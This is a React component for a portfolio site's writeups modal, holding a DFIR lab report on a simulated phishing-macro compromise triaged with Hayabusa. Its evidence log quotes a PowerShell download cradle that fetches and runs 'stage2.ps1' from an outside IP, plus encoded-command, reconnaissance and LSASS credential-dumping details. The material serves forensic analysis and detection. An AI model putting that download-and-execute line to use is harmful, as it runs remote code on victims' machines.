import React, { useState } from 'react';
import { Terminal, Shield, FileText, ChevronRight, X, ExternalLink, Activity, ArrowLeft } from 'lucide-react';
import { useLanguage } from '@/lib/LanguageContext';

const writeupList = [
  {
    id: 'windows-artifact-triage-hayabusa',
    title: 'From Event Log to Attack Timeline: A Reproducible Windows Triage Workflow with Hayabusa',
    category: 'DFIR',
    date: '2026-09-02',
    difficulty: 'Intermediate',
    status: 'Lab Research / Postmortem',
    description: 'A structured engineering postmortem investigating a simulated initial compromise. Correlating EVTX telemetry, Sigma rule detections, PowerShell script block logs, and process execution trees into a verifiable timeline.',
    tools: ['Hayabusa v2.17', 'EvtxECmd', 'Timeline Explorer', 'PowerShell 7'],
    tags: ['Windows', 'EventLogs', 'Hayabusa', 'Forensics', 'Sigma', 'Timeline'],
    content: {
      abstract: 'This technical lab report documents an end-to-end digital forensics and incident response (DFIR) investigation conducted on a compromised Windows workstation. Using high-speed Rust-based forensic triage tooling (Hayabusa) correlated with Windows Security, System, and PowerShell Script Block event logs, we reconstruct the complete attack timeline from initial execution to credential harvesting and lateral probing.',
      problem: 'During routine threat hunting, an anomalous outbound SMB connection was detected. Raw event log artifacts (.evtx) were collected from WORKSTATION-04. Objective: Determine initial access mechanism, child process lineage, and validate credential access attempts.',
      environment: [
        'Target OS: Windows 10 Enterprise (Build 19045, x64)',
        'Triage Analysis Host: Linux Kernel 7.0 / Ubuntu 24.04',
        'Tooling: Hayabusa v2.17.0 (Sigma v0.22 ruleset), EvtxECmd v1.5.0, Custom Python normalizer'
      ],
      methodology: [
        'Phase 1: High-Speed Triage with Hayabusa (hayabusa csv-timeline -d ./evidence/logs/ -o ./results/triage_timeline.csv --profile super-verbose --min-level medium)',
        'Phase 2: PowerShell Script Block Analysis (Filtering EID 4104 for AMSI-logged script blocks)',
        'Phase 3: Process Execution Tree Mapping (Parent-Child correlation on EID 4688 with full command-line auditing)'
      ],
      evidence: [
        { event: 'EID 4688 (Process Creation)', timestamp: '14:22:08.114 UTC', detail: 'WINWORD.EXE spawned cmd.exe -> powershell.exe -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0...' },
        { event: 'Decoded Payload', timestamp: '14:22:12.430 UTC', detail: 'Invoke-WebRequest -Uri "http://198.51.100.42:8080/stage2.ps1" -OutFile "$env:TEMP\\update.ps1"; & "$env:TEMP\\update.ps1"' },
        { event: 'LSASS Handle Access (Sysmon 10)', timestamp: '14:25:31.002 UTC', detail: 'Target lsass.exe opened with GrantedAccess 0x1010 (VM_READ | QUERY_LIMITED_INFORMATION). Flagged: Mimikatz memory dump attempt.' }
      ],
      timeline: [
        '[14:22:08 UTC] ─── WINWORD.EXE spawns cmd.exe (Phishing Macro Execution)',
        '       │',
        '[14:22:12 UTC] ─── PowerShell executes Stage 2 Download Cradle',
        '       │',
        '[14:23:45 UTC] ─── Reconnaissance: whoami.exe /all & net user /domain',
        '       │',
        '[14:25:31 UTC] ─── LSASS Handle Opened (Credential Dumping Attempt)',
        '       │',
        '[14:26:10 UTC] ─── Process Terminated by EDR / Host Isolated'
      ],
      findings: [
        'Root Cause: Malicious macro execution initiated secondary payload staging.',
        'Credential Exposure: Read handle opened against LSASS; credential invalidation required.',
        'Lateral Probing: Host isolated before successful lateral authentication occurred.'
      ],
      limitations: 'Memory dump was not captured at the exact millisecond of in-memory injection; C2 SSL traffic uninspected without host TLS key log.',
      reproduction: 'Sanitized EVTX test bundle available. Execute Hayabusa with Sigma rule ID f4bbd493-b796-416e-bbf2-12123534821 to verify trigger confidence.'
    }
  }
];

export default function WriteupsModal({ isOpen, onClose }) {
  const { lang } = useLanguage();
  const [selectedWriteup, setSelectedWriteup] = useState(null);
  const [filter, setFilter] = useState('ALL');

  if (!isOpen) return null;

  const activeCategories = ['ALL', 'DFIR', 'INFRA', 'SYSTEMS', 'MALWARE', 'NETWORK'];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 sm:p-6 bg-black/85 backdrop-blur-md animate-in fade-in duration-200">
      <div className="relative w-full max-w-5xl h-[88vh] flex flex-col bg-[#0d0f14] border border-[#1f2430] rounded-xl shadow-2xl overflow-hidden text-slate-200 font-sans">
        
        {/* Modal Terminal Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-[#1f2430] bg-[#111318]/90">
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5">
              <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
              <div className="w-3 h-3 rounded-full bg-amber-500/80"></div>
              <div className="w-3 h-3 rounded-full bg-emerald-500/80"></div>
            </div>
            <span className="font-mono text-xs text-cyan-400 font-semibold tracking-wider flex items-center gap-1.5 ml-2">
              <Terminal className="w-4 h-4" />
              PARSA.SARIRI // TECHNICAL_WRITEUPS_&_LAB_REPORTS
            </span>
          </div>
          <button 
            onClick={onClose}
            className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-[#1a1d24] transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Main Content Area */}
        <div className="flex-1 overflow-y-auto p-6">
          {!selectedWriteup ? (
            <div>
              {/* Index Top Banner */}
              <div className="mb-8">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-950/40 border border-cyan-500/30 text-cyan-400 font-mono text-xs mb-3">
                  <Activity className="w-3.5 h-3.5" />
                  <span>REPRODUCIBLE RESEARCH & ENGINEERING POSTMORTEMS</span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-mono font-bold text-white mb-2">
                  LAB NOTEBOOK & TECHNICAL INVESTIGATIONS
                </h2>
                <p className="text-sm text-slate-400 max-w-2xl font-light">
                  Hands-on incident triage reports, network infrastructure blueprints, and memory/binary forensics documented with verifiable evidence and primary telemetry.
                </p>
              </div>

              {/* Categories */}
              <div className="flex flex-wrap items-center gap-2 mb-6 font-mono text-xs border-b border-[#1f2430] pb-4">
                {activeCategories.map(cat => (
                  <button
                    key={cat}
                    onClick={() => setFilter(cat)}
                    className={`px-3 py-1.5 rounded transition-all ${
                      filter === cat 
                        ? 'bg-cyan-500 text-black font-semibold shadow-[0_0_15px_rgba(0,229,255,0.3)]' 
                        : 'bg-[#111318] text-slate-400 hover:text-slate-200 border border-[#1f2430]'
                    }`}
                  >
                    [{cat}]
                  </button>
                ))}
              </div>

              {/* Writeup Card */}
              <div className="grid grid-cols-1 gap-4">
                {writeupList
                  .filter(w => filter === 'ALL' || w.category === filter)
                  .map(item => (
                    <div 
                      key={item.id}
                      onClick={() => setSelectedWriteup(item)}
                      className="group p-6 rounded-xl bg-[#111318] border border-[#1f2430] hover:border-cyan-500/50 hover:bg-[#14171f] transition-all cursor-pointer flex flex-col justify-between"
                    >
                      <div>
                        <div className="flex items-center justify-between font-mono text-xs mb-3">
                          <span className="px-2.5 py-0.5 rounded bg-cyan-950/60 border border-cyan-500/30 text-cyan-300 font-semibold">
                            [{item.category}]
                          </span>
                          <span className="text-slate-400">{item.date}</span>
                        </div>

                        <h3 className="text-lg font-mono font-bold text-white group-hover:text-cyan-400 transition-colors mb-2">
                          {item.title}
                        </h3>

                        <p className="text-xs text-slate-400 mb-4 font-light leading-relaxed">
                          {item.description}
                        </p>

                        <div className="flex flex-wrap gap-1.5 mb-4 font-mono text-[11px]">
                          {item.tools.map(tool => (
                            <span key={tool} className="px-2 py-0.5 rounded bg-[#1a1d24] text-slate-300 border border-[#1f2430]">
                              {tool}
                            </span>
                          ))}
                        </div>
                      </div>

                      <div className="flex items-center justify-between font-mono text-xs pt-3 border-t border-[#1f2430] text-slate-400">
                        <span>Difficulty: <strong className="text-slate-200">{item.difficulty}</strong></span>
                        <span className="text-cyan-400 group-hover:translate-x-1 transition-transform flex items-center gap-1 font-semibold">
                          READ_FULL_INVESTIGATION &rarr;
                        </span>
                      </div>
                    </div>
                  ))}
              </div>
            </div>
          ) : (
            /* Detailed Writeup View */
            <div className="animate-in fade-in duration-200">
              <button
                onClick={() => setSelectedWriteup(null)}
                className="inline-flex items-center gap-2 font-mono text-xs text-cyan-400 hover:underline mb-6"
              >
                <ArrowLeft className="w-4 h-4" /> BACK TO WRITEUPS INDEX
              </button>

              <header className="border-b border-[#1f2430] pb-6 mb-8">
                <div className="flex flex-wrap items-center gap-3 font-mono text-xs mb-3">
                  <span className="px-2.5 py-0.5 rounded bg-cyan-950/60 border border-cyan-500/30 text-cyan-300 font-semibold">
                    [{selectedWriteup.category}]
                  </span>
                  <span className="text-slate-400">{selectedWriteup.date}</span>
                  <span className="text-slate-500">•</span>
                  <span className="text-slate-400">{selectedWriteup.status}</span>
                </div>

                <h1 className="text-2xl sm:text-3xl font-mono font-bold text-white mb-4 leading-snug">
                  {selectedWriteup.title}
                </h1>

                <div className="flex flex-wrap gap-2 font-mono text-xs">
                  {selectedWriteup.tools.map(tool => (
                    <span key={tool} className="px-2.5 py-1 rounded bg-[#111318] text-cyan-400 border border-cyan-500/20">
                      Tool: {tool}
                    </span>
                  ))}
                </div>
              </header>

              {/* Body Sections */}
              <div className="space-y-8 font-sans text-sm text-slate-300 leading-relaxed">
                <section>
                  <h2 className="text-lg font-mono font-bold text-white border-b border-[#1f2430] pb-2 mb-3">
                    1. Abstract & Executive Summary
                  </h2>
                  <p>{selectedWriteup.content.abstract}</p>
                </section>

                <section>
                  <h2 className="text-lg font-mono font-bold text-white border-b border-[#1f2430] pb-2 mb-3">
                    2. Problem Statement
                  </h2>
                  <p>{selectedWriteup.content.problem}</p>
                </section>

                <section>
                  <h2 className="text-lg font-mono font-bold text-white border-b border-[#1f2430] pb-2 mb-3">
                    3. Environment & Setup
                  </h2>
                  <ul className="list-disc list-inside space-y-1 text-slate-300 font-mono text-xs">
                    {selectedWriteup.content.environment.map((item, idx) => (
                      <li key={idx}>{item}</li>
                    ))}
                  </ul>
                </section>

                <section>
                  <h2 className="text-lg font-mono font-bold text-white border-b border-[#1f2430] pb-2 mb-3">
                    4. Verifiable Evidence Log
                  </h2>
                  <div className="space-y-3">
                    {selectedWriteup.content.evidence.map((ev, idx) => (
                      <div key={idx} className="p-4 rounded-lg bg-[#111318] border border-[#1f2430] font-mono text-xs">
                        <div className="flex items-center justify-between text-cyan-400 font-semibold mb-1">
                          <span>{ev.event}</span>
                          <span className="text-slate-500">{ev.timestamp}</span>
                        </div>
                        <p className="text-slate-300 font-sans text-xs break-all">{ev.detail}</p>
                      </div>
                    ))}
                  </div>
                </section>

                <section>
                  <h2 className="text-lg font-mono font-bold text-white border-b border-[#1f2430] pb-2 mb-3">
                    5. Reconstructed Attack Timeline
                  </h2>
                  <pre className="p-4 rounded-lg bg-[#0a0b0e] border border-[#1f2430] text-cyan-300 font-mono text-xs overflow-x-auto">
                    {selectedWriteup.content.timeline.join('\n')}
                  </pre>
                </section>

                <section>
                  <h2 className="text-lg font-mono font-bold text-white border-b border-[#1f2430] pb-2 mb-3">
                    6. Findings & Limitations
                  </h2>
                  <ul className="list-disc list-inside space-y-1 mb-4 text-slate-300 text-xs">
                    {selectedWriteup.content.findings.map((f, idx) => (
                      <li key={idx}>{f}</li>
                    ))}
                  </ul>
                  <div className="p-3 rounded bg-amber-950/30 border border-amber-500/30 text-amber-300 text-xs font-mono">
                    <strong>LIMITATION:</strong> {selectedWriteup.content.limitations}
                  </div>
                </section>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
